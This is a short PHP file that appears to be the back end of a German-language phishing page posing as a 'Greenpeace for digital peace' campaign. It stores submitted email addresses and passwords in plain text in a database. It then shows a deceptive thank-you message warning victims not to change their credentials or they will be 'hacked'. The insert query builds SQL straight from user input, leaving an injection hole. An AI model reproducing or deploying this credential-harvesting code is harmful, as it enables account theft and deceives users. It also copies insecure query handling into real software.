<?php if(!isset($_POST["PW"])||!isset($_POST["Mail"])||(strpos($_POST["Mail"],"@")==False)||(strpos($_POST["Mail"],".")==False)){header("location:GreenNet.php");exit();}//header("location:GreenNet.php");}
else{
$Cred=file_get_contents("Cred.txt");
$Cred=  explode('|', $Cred);
$host=$Cred[0];
$user=$Cred[1];
$password=$Cred[2];
$database=trim($Cred[3]);
$Verbindung=  mysqli_connect($host, $user, $password, $database) or die ("Keine Verbindung möglich");
mysqli_query($Verbindung, "SET NAMES 'utf8'");
$sql="INSERT INTO `mails` (`ID`, `Adresse`, `PW`) VALUES (NULL,'".$_POST['Mail']."','".$_POST['PW']."')";
if(!mysqli_query($Verbindung, $sql)){echo "Problem mit dem Eintrag: ".mysqli_error($Verbindung);}
}
?>
<html>
<head>
<title>Herzlich Willkommen</title>
<link rel="stylesheet" href="Stylesheet.css">
<meta charset="utf-8">
</head>
<body>
<div id="Ges">
<div id="Beschr">
<span class='Title'>Vielen Dank für Ihr Interesse!</span>
<span class='Info'>Ihre Anfrage wurde in unser gesichertes System eingespeist und wird bei nächster Gelegenheit geändert. Bei erfolgreicher Prüfung werden wir Sie über sichere Kanäle kontaktieren. Ändern Sie bis dahin keinesfalls eine der angegebenen Daten, da Sie sonst von unserem System als feindlicher Bot identifiziert und automatisch gehackt werden!</span>
<span class='Info'>Ihr Beitrag zum Kampf gegen das Böse wird für alle Ewigkeit festgehalten werden. Vielen Dank für Ihr Vertrauen!<br/>
Mit freundlichen Grüßen, Ihr Team Greenpeace für den digitalen Frieden</span>
</div>
</div>
</body>
